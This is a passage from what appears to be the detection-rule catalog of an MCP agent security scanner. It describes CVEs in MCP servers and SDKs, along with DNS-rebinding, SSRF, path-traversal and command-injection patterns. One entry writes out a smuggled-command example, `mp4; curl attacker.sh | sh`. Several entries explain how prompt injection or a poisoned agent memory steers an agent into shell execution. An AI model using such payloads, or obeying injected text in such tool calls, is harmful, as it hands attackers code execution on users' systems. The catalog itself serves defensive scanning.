rules.description: The Serena MCP coding toolkit (`serena-agent`) before 1.5.2 ships a built-in web dashboard that "exposes an unauthenticated Flask API on a fixed, predictable port, with no authentication, no CSRF protection, and no Host header validation. A DNS rebinding attack allows a malicious webpage to reach this API from any browser and write arbitrary content to the agent's persistent memory store, which the agent reads and acts on autonomously. Combined with execute_shell_command using shell=True, this creates a remote code execution chain requiring only that the victim visit a malicious webpage while Serena is running." (NVD, CVE-2026-49471, HIGH CVSS 8.3, CWE-306 + CWE-352, published 2026-07-07). A project depending on `serena-agent` below 1.5.2 (or unpinned, or launched from an unpinned `oraios/serena` / `serena-mcp-server` reference) is exposed. Fixed in 1.5.2.
rules.limitations: Reads the declarations and launchers of `serena-agent` and `serena-mcp-server` in the root dependency manifests and in the root `.mcp.json`, `mcp.json`, `claude_desktop_config.json` and `*.mcp.yaml` or `*.mcp.yml` files, and reports one whose range admits a release below 1.5.2 or that states no version (a git requirement's dotted release tag is its version; a commit, a branch or a tag with no dot, `@v2`, states none), the version a root lockfile resolves when it is below 1.5.2, every `oraios/serena` git or image reference whose tag is below 1.5.2 or missing, and a command line that runs `serena-mcp-server` without fetching it (`uv run --directory ../serena serena-mcp-server`, with or without a `--with` package). A mention of the names that is none of these, such as a server's name, is not read. Only these root-level files are read, so the same server launched from `.cursor/mcp.json` is missed. A file over 2 MB is not read. A lockfile over 32 MiB is not read.
rules.remediation: Upgrade `serena-agent` to >= 1.5.2 and pin it explicitly. 1.5.2 binds the dashboard to loopback, adds a random per-session token, validates the Host header, and enforces CSRF — which together break the DNS-rebinding path. Do not expose the Serena dashboard on a routable interface, and keep `execute_shell_command` behind an explicit approval gate.
rules.title: Serena MCP toolkit < 1.5.2 (unauthenticated dashboard → DNS-rebinding RCE)

rules.description: `@0xshariq/github-mcp-server` (npm; 0xshariq/github-mcp-server), a git MCP server, builds its git commands as strings from tool arguments and runs them with `child_process.exec`. The Git Remove tool's `gitRemove(file)` runs `git reset HEAD "${file}"`, so a `file` argument carrying `$(...)` or a closing quote runs shell commands as the server's user, and an agent that reads untrusted text can be steered into that call. The only check, that the command starts with `git `, does not stop it (CVE-2026-102906, CVSS 3.1 6.3, CWE-77/CWE-78). The same `exec` of an interpolated string backs most of the other git tools. Every published version has it (2.0.0 through 2.5.0, the newest), the project has not answered the report (issue #2), and there is no fixed release, so this is a presence-only pin.
rules.limitations: Reports a reference that names `@0xshariq/github-mcp-server`: a package.json or lockfile entry, or the package in an MCP config. Presence-only: every version is reported, a future fixed one included, until the pin gets a floor. GitHub's own `github-mcp-server` and `@modelcontextprotocol/server-github` are different projects and are not matched. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: There is no fixed release. Remove the server from agents that read untrusted content, or replace it with a git MCP server that passes arguments to `execFile`/`spawn` as an array. Pin the first fixed release once it ships.
rules.title: @0xshariq/github-mcp-server runs git commands built from tool arguments through a shell (no fixed release)

rules.description: A process that registers MCP tools also binds an HTTP listener whose routes carry no authentication dependency or middleware (CWE-306, Missing Authentication for a Critical Function). The MCP transport itself may be authenticated or stdio-only, but the sidecar dashboard / status API / debug UI beside it is not, and it is backed by the same process state and the same operator credentials. Binding to loopback is not an authorization boundary: the listener is reachable by DNS rebinding from any page the operator visits, and by any co-located SSRF on the host. Distinct from `AAK-MCP-HTTP-NOAUTH-SERVER-001`, which covers the MCP endpoint itself bound to a non-loopback interface or serving wildcard CORS; this rule covers the *second* listener, on loopback, that the threat model forgot.
rules.limitations: Detects the listener and the absence of an auth marker in the same file. An auth check applied from a separate middleware module that this file never references will read as absent.
rules.remediation: Put authentication on the sidecar's routes, not just on the MCP transport. A bearer token or API-key header checked in middleware is enough, and unlike a loopback bind it also survives DNS rebinding. If the surface exists only for local debugging, gate it behind an explicit opt-in flag that is off by default.
rules.title: MCP server binds an unauthenticated sidecar HTTP surface

rules.description: An HTTP listener beside an MCP server binds 127.0.0.1 / ::1 and relies on that bind as its access control, with no Host-header allow-list (CWE-350, Reliance on Reverse DNS Resolution). This is the DNS-rebinding precondition: an attacker page resolves its own hostname to a public IP, then re-resolves it to 127.0.0.1, and the browser delivers the request to the loopback listener with an attacker-chosen Host header. The bind address never enters into it, because the packet genuinely does arrive on loopback. Only a Host-header allow-list rejects it. Suppressed when the app enforces request-borne credentials (bearer token, API-key header), which a rebinding attacker cannot supply; not suppressed by cookie or session auth, which the browser attaches on the attacker's behalf. Complements `AAK-DNS-REBIND-001`, which owns the MCP SDK's own StreamableHTTP transport; this rule stands down on those.
rules.limitations: Detects a literal loopback bind. A bind address read from config at runtime is not resolved, so a server that defaults to loopback via a settings object will not be flagged.
rules.remediation: Add a Host-header allow-list to the listener — FastAPI/Starlette's TrustedHostMiddleware, or an equivalent check that rejects any Host not in {localhost, 127.0.0.1, ::1}. Keep the loopback bind, but stop treating it as the control.
rules.title: Loopback bind used as access control with no Host-header allow-list

rules.description: SiYuan (siyuan-note/siyuan), a self-hosted notes app, serves MCP from its own kernel, and the Docker Hub image `b3log/siyuan` is how it runs on a server. Its `asset` MCP tool has an `upload` action that copies local files into the workspace, and the kernel serves workspace assets back over HTTP at `/assets/`. The action shipped in 3.7.0 reading any absolute path (GHSA-p23f-cm6q-2qp8, fixed in 3.8.1), and 3.8.1 checks paths against a sensitive-path list that leaves out `.env` and other secret files, so through 3.8.6 a client holding an API token could have a `.env` from the server user's home copied into the workspace and read it back (CVE-2026-116168, CVSS 3.1 6.2, CWE-22, GHSA-q768-4j87-gf3w). 3.8.7 adds `.env`, matched as a prefix so `.env.local` too, macOS `Library` and Windows `AppData` to the list.
rules.limitations: Reads image references only: an `image:` value or any other mention of `b3log/siyuan:TAG` in YAML (compose files, Kubernetes manifests, MCP configs), a Helm values mapping of `repository` and `tag`, Dockerfile and Containerfile `FROM`, and `docker run` arguments in `*mcp*.json` and `claude_desktop_config.json`. Tags from v3.7.0 below v3.8.7 are reported, pre-release tags included (v3.7.0-rc.1 reads as 3.7.0); tags below v3.7.0 predate the MCP asset tool and are not. Every pre-release tag that reads as 3.8.7 or later was pushed after the fix, and `latest` was the v3.8.8 image on 2026-10-26, so an untagged reference is not reported. The rule reads the tag, not whether any MCP client holds a token for the kernel, so a container no agent talks to is reported too. A desktop install, or a kernel built from source, states no version AAK reads, and npm's and PyPI's `siyuan` are other projects. `docker.io/b3log/siyuan` and mirrors under another registry are not matched, and commented-out lines are skipped.
rules.remediation: Run `b3log/siyuan` v3.8.7 or later, pinned by version. 3.8.7 still checks names against a list, so keep credential files out of the home directory of the user SiYuan runs as, and give MCP clients a token only on a workspace they may read in full.
rules.title: SiYuan image from 3.7.0 below 3.8.7: the MCP asset tool copies .env files into the workspace, where /assets/ serves them back

rules.description: An MCP tool handler passes an attacker-controllable URL argument (`url` / `endpoint` / `target` / `uri` and similar) straight into an outbound fetch (`requests` / `httpx` / `urllib` / `aiohttp`) without validating the host or scheme first, so a caller-supplied URL is fetched server-side and can reach loopback, private-range, or cloud-metadata endpoints (CWE-918, server-side request forgery). NVD, CVE-2026-14748: "A flaw has been found in AIAnytime Awesome-MCP-Server ... the file mcp-wiki/src/mcp_wiki/server.py of the component mcp-wiki/wiki-summary. This manipulation of the argument url causes server-side request forgery. The attack may be initiated remotely. The exploit has been published." (CVSS 6.3 MEDIUM, https://nvd.nist.gov/vuln/detail/CVE-2026-14748).
rules.limitations: Reads only files that contain FastMCP, McpServer, modelcontextprotocol, createTool, `mcp.tool`, `@tool`, `@x.tool`, `.tool(`, `.registerTool`, `from mcp`, `import mcp` (each as whole words), `mcp.server` or `mcp_wiki` (any case). In Python, a parameter counts as a URL when its name is url, uri, endpoint, target, link, href, webhook or callback, with an optional plural `s` and one optional alphanumeric prefix joined by an underscore, in any case (`page_url`, `v2_url`), so `website` is not followed. The fetch has to be in the same function, so a handler that passes `url` to a helper which calls `requests.get` is missed, and any of `ALLOW_HOST(S)`, `ALLOWED_HOST(S)`, `allowlist`, `allow_list`, `urlparse`, `is_private`, `ip_address`, `ip_network`, `validate_url`, `is_safe_url`, `check_url`, `ssrf`, `deny`, `scheme [not] in`, `netloc [not] in`, `hostname [not] in` or `startswith("https` in the function, in any case, counts as validation, even when its result is only logged.
rules.remediation: Deny by default: before fetching, parse the URL, require an https scheme, resolve the host, and reject anything not on an explicit host allow-list (also reject RFC 1918, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7). Disable automatic redirects or re-validate every hop, and pin the resolved IP for the actual request to defeat DNS rebinding.
rules.title: MCP tool handler fetches a caller-supplied URL without host/scheme allow-list

rules.description: MCP-for-Stata (PyPI `stata-mcp`) reaches OS command execution twice over, by the same route: an unsanitized parameter is concatenated into a Stata command string, and Stata's own `shell` / `python` escapes turn that into the operating system. CVE-2026-47708 (< 1.17.3) is the `log_file_name` parameter of `stata_do` — the `GuardValidator` scans only the do-file content, never the parameter. CVE-2026-55071 (< 1.19.0, CVSS 3.1 8.4, GHSA-49m4-vp58-wgc9) is the `package` parameter of `ado_package_install`, which is in the **default** tool profile, so no non-default configuration is required. The command is handed over as an argv element, which stops shell metacharacters and does nothing at all about newline injection into Stata's command language. Fixed in 1.19.0; treat < 1.19.0 (and unpinned) as exposed.
rules.limitations: Reads `stata-mcp` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `stata-mcp` to >= 1.19.0 and pin it. Allow-list both the `log_file_name` and `package` parameters (reject quotes, newlines, and Stata command separators) rather than relying on the do-file content guard or on argv quoting.
rules.title: stata-mcp < 1.19.0 (Stata command injection, two CVEs)

rules.description: Server or client code reads, writes, asserts, or constants the `Mcp-Session-Id` header. The ratified MCP 2026-07-28 spec removes the `Mcp-Session-Id` header and the protocol-level session, replacing them with explicit server-minted state handles (SEP-2567); SEP-1442 / SEP-2575 make the initialization handshake optional so stateless is the default. After the final spec lands on 2026-07-28, code that depends on this header (or on the session it represented) will silently break: any MCP request can land on any server instance, and sticky routing / shared session stores at the protocol layer are no longer guaranteed.
rules.limitations: Runs only when a manifest at the project root names an MCP SDK: `mcp`, `modelcontextprotocol` or `model-context-protocol` as a dependency in `pyproject.toml` (`[project]` and optional dependencies, `[dependency-groups]`, Poetry, uv or PDM) or on a `requirements*.txt` line, an `@modelcontextprotocol/sdk`, `@anthropic-ai/mcp` or `@anthropic-ai/claude-agent-sdk` dependency in `package.json`, `io.modelcontextprotocol` in a Maven or Gradle build, or an `mcp` or `modelcontextprotocol` line in `Cargo.toml`. A framework that wraps the SDK (`fastmcp`), the Rust SDK crate `rmcp`, a dependency declared only in `setup.py`, and a manifest in a subdirectory (`svc/package.json`) do not count. When it runs, it looks in source files for the header text `Mcp-Session-Id` (any case) or the constant `MCP_SESSION_ID`. A source file over 512 KB, a config file over 1 MB or a manifest over 2 MB is not read.
rules.remediation: Migrate to the 2026-07-28 stateless transport: route on the `Mcp-Method` header instead of `Mcp-Session-Id`, drop the per-connection session id, and treat each request as independently addressable. If per-server state is genuinely required, persist it behind an out-of-band identity (auth subject, OAuth `sub`, tool argument) rather than the removed session header.
rules.title: Reliance on `Mcp-Session-Id` header / protocol-level session id

rules.description: Server or client code dispatches, handles, or names the `tasks/list` JSON-RPC method. The ratified MCP 2026-07-28 spec removes `tasks/list` from the core because it cannot be scoped safely without the protocol-level session: the experimental Tasks primitive (SEP-1686) moves out of the core specification into the Extensions framework (redesigned as SEP-2663), and the stateful list surface has no stateless successor in core.
rules.limitations: Reads source files only in a project whose root manifest names an MCP SDK in a form AAK-MCP-STATELESS-001 recognises, and matches the quoted method name `tasks/list` and calls spelled `tasks.list(` or `tasks_list(`. An SDK call named `listTasks()` is not matched. A source file over 512 KB, a config file over 1 MB or a manifest over 2 MB is not read.
rules.remediation: Stop calling and handling `tasks/list`. If your application needs an enumeration of in-flight work, model it as an extension primitive scoped to an authenticated identity, or store task identifiers client-side and re-query them with `tasks/get` style point lookups.
rules.title: Use of removed `tasks/list` method

rules.description: An MCP server's deployment manifest requires sticky routing (nginx `ip_hash`, Kubernetes `sessionAffinity: ClientIP`, Traefik / ALB sticky cookies) or its handler code reads a shared session store keyed by a per-connection id used across requests. The 2026-07-28 stateless transport guarantees that any MCP request can land on any server instance — sticky routing and gateway deep-packet-inspection to keep a client pinned to one pod stop being safe assumptions.
rules.limitations: Looks for nginx `ip_hash;` or `sticky cookie|route|learn`, Kubernetes `sessionAffinity: ClientIP`, `stickiness.enabled = true` and a Traefik `sticky:` cookie block in .yaml, .yml, .conf and .toml files and in Caddyfile that mention MCP or belong to a project that declares an MCP SDK, and, in such a project, source lookups of `session_store`, `sessions`, `state_by_session` or `per_session_state` indexed by `session_id`, `sid` or `mcp_session_id`. Pinning clients some other way, such as nginx `hash $http_mcp_session_id consistent;`, is not matched. A source file over 512 KB, a config file over 1 MB or a manifest over 2 MB is not read.
rules.remediation: Remove sticky-session affinity from the gateway and Kubernetes service. Move per-request state into an external store keyed on an out-of-band identity (auth subject) rather than a per-connection session id. Re-test horizontal scaling without affinity before the 2026-07-28 cutover.
rules.title: Sticky-session / shared-store dependency in MCP deployment

rules.description: Client code calls `tools/list` (or the SDK alias `list_tools`) inside a hot path / per-request loop with no caching marker (no `lru_cache`, TTL cache, dict memoization, or `cached_*` helper) nearby. Combined with reliance on per-session server state, this pattern multiplies round-trips and breaks when the 2026-07-28 stateless transport lets successive requests hit different server instances with different tool catalogs.
rules.limitations: Reads source files only in a project whose root manifest names an MCP SDK in a form AAK-MCP-STATELESS-001 recognises. It fires on a file that calls `tools/list` (or `list_tools(`, `.tools.list(`) at least twice, mentions `session_id` or the session header, and contains none of `lru_cache`, `cached_property`, `cachetools`, `TTLCache`, `ttlMs`, `ttl_ms`, `ttlSeconds`, `ttl_seconds`, `tools_list_cache`, `cached_tools`, `memoize` or `functools.cache`. A single `tools/list` call inside a per-request handler is not counted, and neither are calls made through the TypeScript SDK's `client.listTools()`. A source file over 512 KB, a config file over 1 MB or a manifest over 2 MB is not read.
rules.remediation: Cache the `tools/list` response client-side with an explicit TTL (`ttlMs`) and refresh it on cache miss or on a server-pushed `notifications/tools/list_changed`. Treat tool discovery as a hint that may differ between instances under the stateless transport.
rules.title: MCP client never caches `tools/list` and depends on per-session state

rules.description: A Python function calls `StdioServerParameters(command=..., args=...)` from `mcp.client.stdio` / `modelcontextprotocol.client` while also reading from a network-controlled source (request body, fetched JSON, environment variable wired to a webhook, untrusted YAML). The OX MCP April-2026 architectural class makes this exploitable: the SDK executes whatever ends up in `command`/`args` verbatim. The same class without the SDK is a hand-rolled launcher: `subprocess.Popen`, `subprocess.run` or `asyncio.create_subprocess_exec` over `shlex.split()` of a stored server record's command field (`server.endpoint_or_command`, `cfg["command"]`), in a class or function that manages MCP STDIO servers, with no executable allowlist between the split and the spawn. A command users register over an application's API is as network-controlled as a request body (CVE-2026-93965, SxDevOps). Both arms are AST within one function, not data flow across functions. See AAK-STDIO-001 for the broader sink-pattern detector; this rule is the launcher-side counterpart.
rules.limitations: Reads one function at a time. A `StdioServerParameters(command=, args=)` call counts as tainted when its command or args come straight from a request, HTTP-client, `os.environ`, `json.loads` or `yaml.load` expression, from a parameter named body, payload, req, request, event, untrusted or user_input, or from a local assigned from such an expression. A value that arrives through any other parameter name (`def build(spec)` called with `request.json()`), through a helper's return value or through an attribute stored on `self` is not followed. A source file over 512 KB is not read.
rules.remediation: Never build `StdioServerParameters.command` / `.args`, or the argv a launcher splits, from a network-controlled value. Pin `command` to a constant binary path and validate `args` against an allow-list. If a tenant must pick the server, look the choice up in a server-side allow-list keyed by tenant identity, not by a free-form string in the request. An application that stores user-registered STDIO servers must check the executable, and for `npx` or `uvx` the package, against an allowlist before spawning, reject shell metacharacters, and drop `PATH` / `LD_PRELOAD`-style keys from the server's environment.
rules.title: MCP STDIO server launched from network-controlled input (Python)

rules.description: A TypeScript / JavaScript file constructs `new StdioClientTransport({ command, args })` from `@modelcontextprotocol/sdk/client/stdio` shortly after a network-controlled source (`req.body`, `await fetch(...).then(...)`, `process.env.<NETWORK_VAR>`, `JSON.parse(...)`). Same OX MCP April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.
rules.limitations: Reads one file at a time. A `new StdioClientTransport(...)` or `new StdioServerTransport(...)` counts as tainted when its command or args derive, through assignments, destructuring, template strings or one helper return, from `req.body`, `req.query`, `req.params`, `req.headers` (or the `request`, `ctx` and `context` forms), `process.env`, `JSON.parse` or an awaited fetch or axios call in that file. A config object passed in from another file (`connect(req.body)` in routes.ts, `connect(cfg)` in client.ts) is not followed, with or without the optional tree-sitter extra. Without that extra (`agent-audit-kit[taint]`) the rule falls back to proximity, and the evidence ends `[proximity heuristic ...]`: a transport counts as tainted when one of those sources is written in its own `command` or `args` within the first 1,024 characters of the call, comments aside, or when a `req`, `request`, upper-case `process.env`, `JSON.parse` or awaited fetch or axios source appears anywhere in the 1024 characters before it, comments included, whether or not it flows in. A source further back, such as a helper at the top of a long file, is missed. The fallback reads a `/` right after a block's closing brace as a division (`if (a) {} /'/.test(s)`), as it reads one after an object's, so a quote in such a regex can hide the `command` and `args` after it. A source file over 512 KB is not read.
rules.remediation: Pin `command` to a constant binary path; validate `args` against an allow-list before passing them into the transport. Never feed fetched JSON or `req.body` directly into the transport options.
rules.title: MCP StdioClientTransport built from network-controlled input (TypeScript)

rules.description: A Java file constructs `StdioServerParameters.Builder().command(...).args(...).build()` from `io.modelcontextprotocol.sdk.client.stdio` after a network-controlled source (`HttpServletRequest`, `RestTemplate.getForObject`, `WebClient`, `ObjectMapper.readValue(...)`, `System.getenv(...)`). Same OX MCP April-2026 class as AAK-MCP-STDIO-CMD-INJ-001.
rules.limitations: Matches the spelling `StdioServerParameters.Builder()` followed by `.build()` in .java files, with a request parameter, HTTP client, `ObjectMapper` read or `System.getenv` call in the preceding 2 KB or in the chain. The MCP Java SDK's own `ServerParameters.builder(command)` is not matched, and neither is the same code in a Kotlin file. A source file over 512 KB is not read.
rules.remediation: Pin `command()` to a constant; validate `args()` against an allow-list. If using Spring, prefer `@Value`-injected configuration over per-request resolution.
rules.title: MCP StdioServerParameters built from network-controlled input (Java)

rules.description: A Rust file invokes `tokio::process::Command::new(...)` or `std::process::Command::new(...)` in a module that imports `mcp_sdk` / `modelcontextprotocol` after a network-controlled source (`reqwest`, `serde_json::from_str`, `std::env::var`, `hyper::body`, `actix_web::web::Json`, `axum::extract::Json`). Same OX MCP April-2026 class. NOTE: this rule is regex-only, so expect ~10% false-positive rate on macro-heavy code. It is a proximity match, not Rust data-flow analysis. Issue #22 was closed on 2026-08-15 having shipped only a TypeScript slice, so there is no open work item behind this and no reason to wait for one.
rules.limitations: Treats a Rust file as MCP code only if it mentions `mcp_sdk`, `modelcontextprotocol` or `mcp::client::stdio`, so a file that uses the `rmcp` crate and none of those names is not scanned. It also needs one of `reqwest::get`, `reqwest::Client`, `serde_json::from_str`, `serde_json::from_slice`, `std::env::var`, `hyper::body`, `actix_web::web::Json` or `axum::extract::Json` in the 2 KB before `Command::new`; a command taken from `std::env::args()` is not one of them. A source file over 512 KB is not read.
rules.remediation: Pin the `Command::new(...)` argument to a constant binary path and validate any subsequent `.arg(...)` values. Or move the process-spawn out of the request path entirely.
rules.title: MCP STDIO command spawned from network-controlled input (Rust)

rules.description: A Go file calls `exec.Command(...)` or `exec.CommandContext(...)` in an MCP-shaped file, after a network-controlled source in the same scope: `json.NewDecoder(r.Body)`, an `*http.Request` handler parameter, or `c.ShouldBindJSON(...)`. CVE-2026-90898 (maximhq/bifrost, CVSS 9.8) is the anchor: Bifrost registers MCP clients through a management API, a stdio client is a command plus args, and the gateway starts that program the moment the client is added, so one unauthenticated `POST /api/mcp/client` runs a program as the gateway user. Fixed in `transports/v2.1.0`. NOTE: this rule is regex and proximity, exactly like the Rust arm `AAK-MCP-STDIO-CMD-INJ-004`, and not Go data-flow analysis. It reports that a spawn sink appears in an MCP file downstream of a network-shaped source, which is not the same claim as proving the request reaches the sink. Expect false positives where a handler decodes a body and separately shells out to a constant. There is no go/ast pass behind this and none is pending.
rules.limitations: Matches an `exec.Command` or `exec.CommandContext` call in an MCP-shaped Go file with a request-decoding marker (`json.NewDecoder(r.Body)`, an `*http.Request` handler, `ShouldBindJSON`, `mux.Vars`) in the preceding 2 KB, unless its first argument is a string literal. A literal program with the request in the arguments, such as `exec.Command("sh", "-c", req.Command)`, is therefore not reported. A source file over 512 KB is not read.
rules.remediation: Do not build an exec argv from request-controlled values. Resolve the command against a fixed allowlist server-side, pass caller data as data rather than as argv, and require authentication on any route that registers or starts a subprocess: an unauthenticated registration endpoint that spawns is remote code execution by design, not by bug.
rules.title: MCP STDIO command spawned from network-controlled input (Go)

rules.description: An MCP stdio server definition (`command` + `args` in a `.mcp.json` / `mcpServers` block) launches a shell-style interpreter (`npx`, `node`, `bash`, `sh`, `python`) with a code-execution flag (`-c`, `-e`, `--eval`), or passes an arg carrying a template / interpolation token (`${...}` embedded in a larger string, `{{...}}`, `%s`) that is not a pinned static literal. Either shape turns the launched process into an arbitrary-code sink the moment the value is attacker- or model-influenced. This is the CVE-2026-40933 class (Flowise < 3.1.0 unsafely serialised stdio commands in its MCP adapter — an authenticated actor could register an stdio server whose allowlisted launcher, e.g. `npx`, was combined with `-c` to run arbitrary OS commands; CWE-78, CVSS 9.9). Distinct from AAK-MCP-002 (which inspects only the `command` string for `sh -c`/`bash -c` wrappers and shell metacharacters, never `args`) and from the source-code taint rules AAK-MCP-STDIO-CMD-INJ-001..004 (which model `StdioServerParameters(command=tainted)` in Python/TS/Java/Rust). A standalone env reference (`${VAR}`) is treated as pinned and does not fire.
rules.limitations: Fires when the launcher is npx, node, bash, sh, python or python3 and an argument is exactly `-c`, `-e`, `-eval` or `--eval`, or when any argument contains `{{...}}`, `%s` or a `${...}` that is not exactly `${NAME}` (a letter or underscore, then letters, digits or underscores), such as `x-${KEY}` or `${KEY:-x}`; a VS Code variable (`${workspaceFolder}`, `${userHome}`, `${env:...}`, `${input:...}` and the others VS Code documents) does not count, since VS Code substitutes it itself. Combined short flags (`bash -lc "..."`) and other shells (`zsh -c`) are not matched.
rules.remediation: Do not launch interpreters with `-c`/`-e`/`--eval` from an MCP stdio definition. Pin `command` to a concrete server executable and pass only static, literal `args` (e.g. `["--port", "8080"]`). If a value must vary, use a standalone env reference (`${VAR}`) resolved by the host — never interpolate model- or request-derived strings into the argv. Enforce a strict argv allowlist server-side. See AAK-MCP-002 and AAK-FLOWISE-001 for related angles on the same RCE class.
rules.title: MCP stdio server launches a shell-style interpreter with an exec flag or interpolated args

rules.description: The MCP Kotlin SDK (`io.modelcontextprotocol:kotlin-sdk`, and the `kotlin-sdk-core` / `kotlin-sdk-jvm` artifacts that publish the same code) from 0.7.0 through 0.12.0 appends every chunk received from the stdio transport into a `kotlinx.io.Buffer` with no size cap. `ReadBuffer.append` (`kotlin-sdk-core/src/commonMain/kotlin/io/modelcontextprotocol/kotlin/sdk/shared/ReadBuffer.kt`) only extracts a frame once a `\n` (0x0a) byte is observed, so a peer that streams bytes and never sends a newline grows the buffer indefinitely until the JVM — or the host process around it — is OOM-killed. `StdioServerTransport` and `StdioClientTransport` amplify it: both queue raw chunks through a `Channel<ByteArray>(Channel.UNLIMITED)` and then call `readBuffer.append(chunk)` with neither backpressure nor a size guard. CVE-2026-53937, CVSS 6.2 MEDIUM (`AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`), CWE-400 + CWE-770. The impact is availability only, and the attack vector is local because it arrives on stdin — but it is pre-authentication, and the reach is remote wherever an untrusted producer feeds that stdin: a host that exec's the server as a subprocess and pipes bytes from a network peer, or a sidecar proxying an HTTP endpoint onto the stdio transport. Fixed in 0.13.0. The affected range starts at 0.7.0 because that is the first release of `kotlin-sdk-core`, where the buffer lives — a module boundary, not the commit that introduced the defect.
rules.limitations: Dependency-level detection on JVM manifests only — `build.gradle`, `build.gradle.kts`, `gradle/libs.versions.toml` and `pom.xml`. A finding requires a version that actually resolved into 0.7.0–0.12.0, so a dynamic version (`0.+`, `latest.release`) or a `version.ref` pointing at a catalog outside the scanned tree is deliberately not reported. It does not detect the unbounded-buffer shape in first-party code.
rules.remediation: Upgrade `io.modelcontextprotocol:kotlin-sdk` (or `kotlin-sdk-core` / `kotlin-sdk-jvm`) to >= 0.13.0 and pin it. Until then, do not let an untrusted producer write directly to an SDK stdio server's stdin: put a framing proxy in front that enforces a maximum bytes-without-newline budget and drops the peer when it is exceeded, and bound the queue between the reader and the parser rather than using `Channel.UNLIMITED`.
rules.title: MCP Kotlin SDK stdio read buffer grows without bound (CVE-2026-53937, 0.7.0–0.12.0)

rules.description: The `export_state` and `import_state` tools in `src/consciousness-explorer/mcp/server.js` pass the caller-controlled `filepath` parameter to filesystem operations without restricting the destination (CVE-2026-55609), so an MCP client reads or writes outside the intended directory. One advisory, two npm packages, and they carry different floors: `sublinear-time-solver` fixes it in 1.6.0 and `consciousness-explorer` in 1.1.2, so both are pinned under this rule and whichever a project depends on fires below its own floor.
rules.limitations: Reads `sublinear-time-solver` and `consciousness-explorer`, each against its own fix floor, in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `sublinear-time-solver` to >= 1.6.0 and/or `consciousness-explorer` to >= 1.1.2 and pin them. For a state-persistence tool, do not take a path from the caller at all: derive it from a server-side root plus a validated identifier, and resolve-and-contain before opening.
rules.title: consciousness-explorer state tools accept a caller-controlled path (sublinear-time-solver < 1.6.0, consciousness-explorer < 1.1.2)

rules.description: The `mcp-text-editor` MCP server's `_validate_file_path` (`mcp_text_editor/text_editor.py`) mishandles a caller-supplied `file_path`, allowing remote path traversal (CVE-2026-15138, CVSS 6.3). NVD lists versions up to 1.0.2 as affected; the vendor closed the report without an explanation, so treat <= 1.0.2 (and unpinned) as exposed and move to the latest release.
rules.limitations: Reads `mcp-text-editor` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `mcp-text-editor` past 1.0.2 to the latest release and pin it; verify the traversal fix landed. Constrain the editor to an allow-listed root and reject `..` / absolute paths in `file_path`.
rules.title: tumf mcp-text-editor path traversal (affected up to 1.0.2)

rules.description: An MCP tool handler builds a shell command string out of a value that arrives in the tool-call arguments object, then hands that string to a process API — `child_process.exec` / `execSync`, or `spawn` / `execFile` with `shell: true`. Because the string is composed at the call site (a template literal with `${...}`, or a concatenation) the argument is parsed by a shell, so a value such as `mp4; curl attacker.sh | sh` runs as a second command. This is the shape of CVE-2026-78430 (`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, `handleToolCall` in `src/tools/handlers.ts`, CWE-77/CWE-78), which carries a CVSS 3.1 base of only 5.3 because the vector requires a local attacker — but in an agent pipeline the local caller IS the model, and any upstream prompt injection reaches this sink with the server's own privileges, which is why this rule is CRITICAL rather than MEDIUM. The surface is the handler, not the launcher: `AAK-MCP-002` and the `AAK-MCP-STDIO-CMD-INJ-*` family inspect the configured server command before the process starts, whereas this fires on the request path. Detection is a TypeScript/JavaScript source pattern and is deliberately narrower than `AAK-TAINT-001`, which reports any `child_process` call in an MCP file without checking how the command was built; where this rule fires, that one is suppressed on the same line so one defect is reported once.
